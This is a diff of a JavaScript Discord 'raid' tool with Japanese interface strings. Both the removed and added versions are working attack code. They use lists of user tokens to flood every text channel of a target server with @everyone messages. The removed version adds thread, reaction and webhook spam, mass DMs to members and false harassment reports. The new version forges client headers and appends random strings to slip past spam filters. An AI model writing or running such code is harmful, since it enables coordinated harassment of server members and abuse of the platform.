@@ -1,109 +1,97 @@
-const log = (m) => {
-  const t = new Date().toLocaleTimeString('ja-JP',{hour12:false});
-  document.getElementById('log').innerHTML += `[\( {t}] \){m}<br>`;
-  document.getElementById('log').scrollTop = 999999;
+const log = msg => {
+  const t = new Date().toLocaleTimeString('ja-JP');
+  document.getElementById('log').innerHTML += `<div>[\( {t}] \){msg}</div>`;
+  document.getElementById('log').scrollTop = 99999;
 };
 
-let tokens = [], target = null, running = false, msg = "@everyone";
-const f = {};
+let tokens = [], running = false, stop = false;
 
-document.querySelectorAll('[data-f]').forEach(c=> f[c.dataset.f] = c.checked ? true : false);
-document.getElementById('msg').oninput = e => msg = e.target.value || "@everyone";
+const headers = token => ({
+  'Authorization': token,
+  'Content-Type': 'application/json',
+  'X-Super-Properties': btoa(JSON.stringify({
+    os: "Windows", browser: "Chrome", device: "", system_locale: "ja-JP",
+    browser_user_agent: navigator.userAgent, browser_version: "134.0",
+    os_version: "10", referrer: "", referring_domain: "",
+    release_channel: "stable", client_build_number: 999999
+  }))
+});
 
-document.getElementById('tokens').oninput = async () => {
-  tokens = document.getElementById('tokens').value.trim().split('\n').filter(Boolean);
-  document.getElementById('tcount').textContent = tokens.length+"個";
-  if(tokens.length) loadGuilds();
-};
+async function send(token, ch, content, opts = {}) {
+  const payload = { content: content || '' };
+  if (opts.everyone) payload.content = '@everyone\n' + payload.content;
+  if (opts.randomize) payload.content += `\n${crypto.randomUUID()}`;
+  if (opts.randomString) payload.content += ' ' + Math.random().toString(36).slice(2, 10);
+  if (opts.poll) payload.poll = opts.poll;
 
-async function loadGuilds() {
-  const list = document.getElementById('guilds');
-  list.innerHTML = "";
-  const set = new Set();
-  for(const t of tokens){
-    try{
-      const r = await fetch('https://discord.com/api/v10/users/@me/guilds',{headers:{Authorization:t}});
-      if(r.ok){
-        const gs = await r.json();
-        gs.forEach(g=>{
-          if(!set.has(g.id)){
-            set.add(g.id);
-            const d = document.createElement('div');
-            d.className = 'item';
-            d.textContent = g.name;
-            d.onclick = ()=>{
-              document.querySelectorAll('.item').forEach(x=>x.classList.remove('active'));
-              d.classList.add('active');
-              target = g.id;
-              document.getElementById('tname').textContent = g.name;
-              log(`ターゲット → ${g.name}`);
-            };
-            list.appendChild(d);
-          }
-        });
-      }
-    }catch(e){}
+  try {
+    const res = await fetch(`https://discord.com/api/v10/channels/${ch}/messages`, {
+      method: 'POST', headers: headers(token), body: JSON.stringify(payload)
+    });
+    return res.ok;
+  } catch { return false; }
+}
+
+document.getElementById('startBtn').onclick = async e => {
+  e.preventDefault();
+  if (running) return;
+  running = true; stop = false;
+
+  tokens = document.getElementById('tokens').value.trim().split(/[\s,\n]+/).filter(Boolean);
+  const guild = document.getElementById('guildId').value.trim();
+  let channels = document.getElementById('channelIds').value.trim().split(/[\s,\n]+/).filter(Boolean);
+  const msg = document.getElementById('message').value;
+  const delay = parseFloat(document.getElementById('delay').value) * 1000 || 800;
+  const limit = parseInt(document.getElementById('limit').value) || Infinity;
+
+  if (!tokens.length || !guild) return log('トークンまたはサーバーIDを入力');
+  if (!channels.length) {
+    log('チャンネル取得中...');
+    const chs = await fetch(`https://discord.com/api/v10/guilds/${guild}/channels`, {headers: headers(tokens[0])}).then(r => r.json());
+    channels = chs.filter(c => c.type === 0).map(c => c.id);
   }
-}
 
-async function loop(){
-  if(!running || !target) return;
-  const token = tokens[Math.floor(Math.random()*tokens.length)];
+  log(`攻撃開始 → ${channels.length}チャンネル`);
 
-  try{
-    const chs = await fetch(`https://discord.com/api/v10/guilds/${target}/channels`,{headers:{Authorization:token}}).then(r=>r.json());
-
-    for(const ch of chs){
-      if(!running) break;
-
-      // RAIDER
-      if(f.raider && ch.type===0){
-        await fetch(`https://discord.com/api/v10/channels/${ch.id}/messages`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({content:msg})});
-      }
-
-      // THREAD-SPAMMER
-      if(f.thread && ch.type===0){
-        fetch(`https://discord.com/api/v10/channels/${ch.id}/threads`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({name:"raid",type:11})});
-      }
-
-      // REACTION-SPAMMER
-      if(f.react && ch.last_message_id){
-        ["U+1F525","U+1F4A5","U+1F921"].forEach(e=>fetch(`https://discord.com/api/v10/channels/\( {ch.id}/messages/ \){ch.last_message_id}/reactions/${e}/@me`,{method:'PUT',headers:{Authorization:token}}));
-      }
-
-      // WEBHOOK-SPAMMER (チャンネルからWebhook取得→スパム)
-      if(f.webhook){
-        const hooks = await fetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`,{headers:{Authorization:token}}).then(r=>r.json()).catch(()=>[]);
-        hooks.forEach(h=>fetch(h.url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:msg})}));
+  let count = 0;
+  while (running && count < limit && !stop) {
+    for (const token of tokens) {
+      if (stop) break;
+      for (const ch of channels) {
+        if (stop) break;
+        const content = document.getElementById('randomize').checked ? msg + `\n${Date.now()}` : msg;
+        const success = await send(token, ch, content, {
+          everyone: document.getElementById('everyone').checked,
+          randomize: document.getElementById('randomize').checked,
+          randomString: document.getElementById('randomString').checked
+        });
+        if (success) count++;
+        await new Promise(r => setTimeout(r, delay));
       }
     }
-
-    // DM-SPAMMER (サーバーメンバー取得→DM)
-    if(f.dm){
-      const mem = await fetch(`https://discord.com/api/v10/guilds/${target}/members?limit=1000`,{headers:{Authorization:token}}).then(r=>r.json());
-      mem.forEach(m=>fetch('https://discord.com/api/v10/users/@me/channels',{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({recipient_id:m.user.id})}).then(r=>r.json()).then(c=>fetch(`https://discord.com/api/v10/channels/${c.id}/messages`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({content:msg})})));
-    }
-
-    // REPORT-SPAMMER (メッセージがあれば通報)
-    if(f.report && chs[0]?.last_message_id){
-      fetch(`https://discord.com/api/v10/report`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({channel_id:chs[0].id,message_id:chs[0].last_message_id,reason:"harassment"})});
-    }
-
-  }catch(e){}
-
-  setTimeout(loop, f.allch ? 50 : 800);
-}
-
-document.getElementById('start').onclick = () => {
-  if(!target) return alert("サーバーを選択");
-  running = true;
-  log("攻撃開始");
-  loop();
-};
-
-document.getElementById('stop').onclick = () => {
+  }
   running = false;
-  log("攻撃停止");
+  log('完了');
 };
 
-log("RAIDOS FINAL 起動完了");
+document.getElementById('stopBtn').onclick = () => { stop = true; running = false; log('停止'); };
+document.getElementById('leaveBtn').onclick = async () => {
+  const guild = document.getElementById('guildId').value.trim();
+  for (const t of tokens) {
+    await fetch(`https://discord.com/api/v10/users/@me/guilds/${guild}`, {
+      method: 'DELETE', headers: headers(t)
+    });
+  }
+  log('退出完了');
+};
+
+document.getElementById('autoFillChannels').onclick = async () => {
+  const token = tokens[0] || document.getElementById('tokens').value.split('\n')[0];
+  const guild = document.getElementById('guildId').value.trim();
+  if (!token || !guild) return log('トークンとサーバーIDを入力');
+  const chs = await fetch(`https://discord.com/api/v10/guilds/${guild}/channels`, {headers: headers(token)}).then(r => r.json());
+  document.getElementById('channelIds').value = chs.filter(c => c.type === 0).map(c => c.id).join('\n');
+  log('チャンネル取得完了');
+};
+
+log('起動完了');
